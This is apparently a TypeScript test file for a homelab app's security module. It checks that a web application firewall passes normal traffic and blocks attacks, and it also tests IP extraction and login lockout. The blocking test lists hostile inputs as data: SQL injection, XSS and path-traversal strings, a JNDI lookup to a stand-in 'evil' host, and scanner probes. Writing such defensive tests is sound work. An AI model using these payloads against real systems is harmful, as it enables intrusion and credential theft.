import assert from "node:assert/strict";
import { test } from "node:test";
import { banRemaining, clearFailures, clientIp, lockRemaining, recordFailure, wafInspect } from "./security";

const req = (path: string, init: { method?: string; ua?: string } = {}) => ({
  method: init.method ?? "GET",
  url: `http://lab.local${path}`,
  headers: new Headers({ "user-agent": init.ua ?? "Mozilla/5.0" }),
});

test("le WAF laisse passer le trafic légitime", () => {
  for (const p of [
    "/",
    "/inventaire?q=pve-01&kind=vm",
    "/reseau?subnet=3",
    "/login?next=%2Finventaire%2F12",
    "/deploiements/4/modifier",
    "/api/uploads/ab12.svg",
    "/inventaire?q=select%20une%20vm",
  ]) {
    assert.equal(wafInspect(req(p)), null, p);
  }
  assert.equal(wafInspect(req("/", { method: "POST" })), null);
});

test("le WAF bloque les attaques connues", () => {
  const cases: [string, string][] = [
    ["/inventaire?q=1'%20OR%20'1'='1", "sqli"],
    ["/inventaire?q=1%20UNION%20SELECT%20password_hash%20FROM%20users", "sqli"],
    ["/inventaire?q=1;sleep(5)", "sqli"],
    ["/inventaire?q=%3Cscript%3Ealert(1)%3C/script%3E", "xss"],
    ["/inventaire?q=%253Csvg%2520onload%253Dalert(1)%253E", "xss"],
    ["/login?next=javascript:alert(1)", "xss"],
    ["/api/uploads/..%2f..%2fhomelab.db", "traversal"],
    ["/api/uploads/%252e%252e%252fsecret.key", "traversal"],
    ["/?x=${jndi:ldap://evil/a}", "injection"],
    ["/.env", "scanner"],
    ["/wp-login.php", "scanner"],
    ["/.git/config", "scanner"],
  ];
  for (const [p, rule] of cases) assert.equal(wafInspect(req(p)), rule, p);
  assert.equal(wafInspect(req("/", { method: "TRACE" })), "method");
  assert.equal(wafInspect(req("/", { ua: "sqlmap/1.7" })), "scanner-agent");
});

test("clientIp prend la dernière entrée de X-Forwarded-For", () => {
  assert.equal(clientIp(new Headers({ "x-forwarded-for": "6.6.6.6, 192.168.1.20" })), "192.168.1.20");
  assert.equal(clientIp(new Headers({ "x-forwarded-for": "::ffff:10.0.0.5" })), "10.0.0.5");
  assert.equal(clientIp(new Headers()), "unknown");
});

test("verrouillage exponentiel après le seuil, puis bannissement d'IP", () => {
  const now = 1_000_000;
  for (let i = 1; i < 5; i++) assert.equal(recordFailure("user", "alice", now), 0);
  assert.equal(recordFailure("user", "alice", now), 30);
  assert.equal(recordFailure("user", "alice", now), 60);
  assert.equal(lockRemaining("user:alice", now), 60);
  clearFailures("user", "alice");
  assert.equal(lockRemaining("user:alice", now), 0);

  for (let i = 1; i < 10; i++) recordFailure("ip", "203.0.113.9", now);
  assert.equal(banRemaining("203.0.113.9", now), 0);
  assert.equal(recordFailure("ip", "203.0.113.9", now), 60);
  assert.equal(banRemaining("203.0.113.9", now), 60);
  assert.equal(banRemaining("203.0.113.9", now + 61_000), 0);
});
